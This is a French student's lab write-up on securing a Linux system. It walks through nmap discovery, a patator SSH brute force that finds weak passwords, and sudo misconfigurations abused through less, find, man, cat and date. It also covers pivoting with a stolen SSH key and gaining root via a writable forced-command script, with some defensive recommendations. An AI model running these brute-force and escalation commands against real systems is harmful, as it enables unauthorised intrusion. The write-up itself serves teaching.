# TP2 - Sécurisation d’un système Linux
Leonardo Picoli - 13/04/2023

## **Introduction**

Les questions se trouvent dans le fichier [TP Linux](./tp_linux.pdf).

## **1. Découverte des cibles - Rappel TP OSINT**

Après avoir monté votre tunnel VPN (`sudo openvpn cours.ovpn`), on execute le command suivant pour découvrir les routes et les services accéssibles:

`nmap -sV 172.31.7.83`

Ce qui donne, en bref, les résultats suivants:

| PORT | STATE | SERVICE | VERSION | OS
| ------ | ----------- | -------- | ---- | --- |
| 22/tcp | open | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | Linux


Nmap utilise une technique appelée "ping scan" pour détecter un hôte. La méthode ping scan envoie des paquets ICMP Echo Request (ping) à l'adresse IP de destination et attend une réponse. Si le ping est répondu, cela signifie que l'hôte est actif et joignable.

Nmap dispose de plusieurs types de ping scan en fonction des options utilisées. Par exemple, l'option -PE utilise un ping ICMP Echo Request standard, tandis que l'option -PS envoie un paquet SYN TCP vers le port 80. L'option -PU envoie des paquets UDP pour détecter les hôtes qui ne répondent pas aux paquets ICMP.

Le choix de la méthode de ping scan dépend de la configuration du réseau cible, car certaines configurations de pare-feu peuvent bloquer certains types de ping ou de paquets. Nmap est capable d'adapter sa méthode de ping scan en fonction de la configuration du réseau pour maximiser la détection des hôtes.

Pour découvrir les efficacement les hôtes présents sur le réseau, on utilise un pinc scan en utilisant le protocol ICMP Echo Request standard. Pour faire ça, on utilise la commande suivante, par exemple:

`nmap -sn 172.31.7.0/24`

## **2. Serveur WriteHat**

### **Q 2.1 - À partir d’Internet**


### **Q 2.2 - À partir d’un compte sans privilège**

**Obs**: Le fichier avec les mots de passe pour _bruteforcer_ le serveur se trouve **[ici](./passwords.txt)**

En utilisant la commande:

`patator ssh_login host=172.31.7.83 user=<user> password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'`

On a pu trouver les mots de passe suivants:

| User | Mot de passe |
| ---  | ------------ |
| student | **sunshine**  |
| chibollo | **password** |

Les étapes suivantes ont été faites pour élever les privilèges vers le compte **root** à partir d'user **student**:

```
└─$ ssh student@@172.31.7.83
student@172.31.7.83's password: sunshine
```

En tant que **student**, on a éxécuté la commande `sudo -l` pour voir les commandes qui sont éxécuté avec l'élévation de privilèges:

```bash
student@writehat:~$ sudo -l 

Matching Defaults entries for student on writehat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User student may run the following commands on writehat:
    (root) NOPASSWD: /usr/bin/less /var/log/syslog
```

Comme ça on peut voir qui la commande: **_/usr/bin/less /var/log/syslog_** peut être éxécuté comme **root** normalement:

`sudo -u root /usr/bin/less /var/log/syslog`

Dans **less** on peut éxécuter des commandes en ajoutant le char "!", donc il suffit d'éxécuter **bash** ! 

Ce qui nous donne root:  
**<span style="color:red">root</span><span style="color:#0af">@writehat:/home/student</span> <span style="color:green">✔</span> # echo "I am root!"**

![IMROOT](imroot.png)

Si une commande **sudo** accorde des permissions excessives ou permet à des utilisateurs non autorisés d'exécuter des commandes avec ces permissions, cela peut présenter un risque d'élévation de privilèges non maîtrisée.

En résumé, pour éviter les risques d'élévation de privilèges non maîtrisée, il est recommandé de :

* Limiter les commandes sudo aux commandes nécessaires pour les tâches de l'utilisateur.
* Limiter l'accès à ces commandes uniquement aux utilisateurs et groupes de confiance.
* Vérifier régulièrement la configuration sudo pour s'assurer que les autorisations sont correctement définies.

### **Q 2.3 - Root à partir de chibollo**

## **3. Serveur Backup**

### **Q 3.1 - Découverte d’un second backup et connexion !**

Une fois qu'on a obtenu l'accès privilegié, on peut prendre quelques actions pour découvrir et atteindre une seconde serveur. Par exemple: 
1. **history**: On peut utiliser la commande `history` pour voir les dernières commandes qui ont été éxécuté par l'administrateur du système. 
2. **Folders and files**: Nous pouvons également fouiller dans les fichiers et dossiers existants afin de trouver quelque chose (fichier script, par exemple) d'utile pour nous connecter à un autre serveur.

Dans notre cas, on peut facilement voir que dans le directoire principal, il y a un fichier de script visible `/root/rsync.sh` qui a comme contenu:

```sh
#!/bin/bash

SERVER='10.129.42.21'
MODULE='iso'
DESTINATION='/home/backup1/iso'
#--bwlimit=100 \

rsync \
   -avz \
   --progress \
   --partial \
   -e "ssh -p 4343 -i /root/.ssh/id_rsa -l backup1" \
   ${SERVER}::${MODULE} ${DESTINATION}
```

Alors, on peut vour qui nous pouvouns nous connecter à une autre serveur facilement en utilisant la clé privé déjà present et la commande: 

`ssh -p 4343 -i /root/.ssh/id_rsa -l backup1 10.129.42.21`

Pour utiliser le script de manière plus  sécurisé: 
1. On peut essayer de mieux cacher la localisation du script de connexion dans d'autres dossier et directoires. 
2. Utiliser des clés SSH avec des mots de passe : L'administrateur système doit utiliser des clés SSH avec des mots de passe pour l'authentification au lieu de stocker des clés privées non chiffrées. Ainsi, même si un pirate informatique accède au serveur, il ne pourra pas utiliser la clé SSH sans connaître le mot de passe.

### **Q 3.2 - Différentes techniques d’élévation de privilèges à partir d’une configuration vulnérable de sudo**

**backup1 → backup2 : /usr/bin/find**   
`sudo -u backup2 /usr/bin/find . -exec bash {} \;`  
C'est possible de executer des commandes avec find, alors il suffit de executer **bash**

**backup2 → backup3 : /usr/bin/man**  
C'est possible aussi d'executer des commandes avec **man**, il suffit d'executer bash:   
`sudo -u backup3 man man → !bash`

**backup3 → backup4 : /bin/cat**
Celui-ci est un peu plus délicat. Avec cat on peut voir le contenu des documents présents dans le fichier d'user _backup4_, especialement celles de ssh !   
On peut voir que le contenu du fichier _/home/backup4/.ssh/authorized_keys_ est égal au contenu du fichier _/home/backup4/.ssh/id_rsa.pub_; ça veut dire que on peut accéder l'user **backup4** en utilisant **SSH** et sa clé privé **id_rsa**.  
Comme on a le droit de faire **_cat_**, on peut simplement éxécuter la commande suivante pour copier le contenu de id_rsa d'user backup4 dans une fichier local d'user backup3:  
`sudo -u backup4 cat /home/backup4/.ssh/id_rsa > id_rsa`  
et finalement on peut se connécter avec SSH:  
`ssh -i id_rsa backup4@localhost -p 4343`

**backup4 → backup5 : /bin/date**  
Le même concept est appliqué ici pour prendre la valeur du fichier id_rsa d'user **backup5**, en utilisant la commande:  
`sudo -u backup5 date -f /home/backup5/.ssh/id_rsa`  
Mais, dans ce cas, on doit traîter les données, vu qu'elles sont pas dans la bonne forme:  
```
date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’
date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn’
date: invalid date ‘NhAAAAAwEAAQAAAQEAyaGKDwy0IbWEr0pTjIh0GPLn84aHmFnNGVrZQCpeh4BBsC+9xrQe’
date: invalid date ‘3wwxXkad70N+UNFm68Mc4Wxxcu8RHwwJ1PVEm0BrQN/0PKMQ4Q1vZ27O01+N8N4/Xucm6I’
date: invalid date ‘Vltdg/Db2R4qRKFLTlVqchSYW4KsnGcM2i9pFbzMDMN7+HHrBJ22cK1tAFQFiKWt+BAusO’
...
```

On utilise vim pour traiter des données et les mettre dans la bonne forme en faisant `:%s/date: invalid date .//g` et après `:%s/.$//g`. Après on peut accéder en utilisant SSH:

`ssh -i id_rsa backup5@localhost -p 4343`

## **4.  Root sur le serveur backup !**

Dans la compte d'user backup5, on peut pas utiliser la commande `sudo -l` comme tout à l'heure. Il faut trouver une autre moyen d'accéder en root. On peut voir que, si on essaie la commande `ssh -p4343 -lroot localhost`, la commande affiche le message suivant: 

>=========================================  
enter the command number you want to run:   
allowed commands are :  
=========================================    
[1] /usr/lib/nagios/plugins/check_host localhost  
[2] /usr/lib/nagios/plugins/check_icmp localhost  
[3] /usr/lib/nagios/plugins/check_load -w 1,1,1 -c 10,10,10  
[4] /usr/lib/nagios/plugins/check_http -I 127.0.0.1  
[5] /usr/lib/nagios/plugins/check_ssh -4 -p 22 localhost  
[6] /usr/lib/nagios/plugins/check_users -w 2 -c 3  
[7] /usr/lib/nagios/security_plugins/answer_question.sh  
^--- this one answers the question !  
=========================================  
Which command do you wanna run ?

et après avoir choisi l'option 7, il affiche le message: 

"**Tu y es presque toi aussi <3**"

Alors si on modifie le contenu du fichier pour ouvrir bash et executer la même commande, on peut accéder **root**:

`vim /usr/lib/nagios/security_plugins/answer_question.sh`

et on modifie le contenu du fichier: 
```bash
#!/bin/bash
/bin/bash
echo "Tu y es presque toi aussi <3"
```

et après on fait la même chose `ssh -p4343 -lroot localhost` et choisir l'option 7, ce qui nous donne root:  
**<span style="color:red">root</span><span style="color:#0af">@backup</span> <span style="color:green">✔</span> # echo "I am root!"**

![IMROOT](imroot.png)

Le mécanisme qui nous a
permis de nous contraindre à l’exécution de ce script, ce que il n'y a pas de restriction d'écriture dans le fichier _/usr/lib/nagios/security_plugins/answer_question.sh_ pour l'user backup5. Aussi, on peut accéder à cet user en utilisant SSH, ce qui ouvre une nouvelle possibilité de trouver des failles de sécuité. 

Le recommendation que je pourrais formuler au défenseur c'est de être bien attentif avec les permissions de fichier aux autres utilisateurs du système, et aussi d'essayer de éteindre le serveur SSH pour accéder au root, et protéger l'accèss au root seulement avec un mot de passe bien formulé.








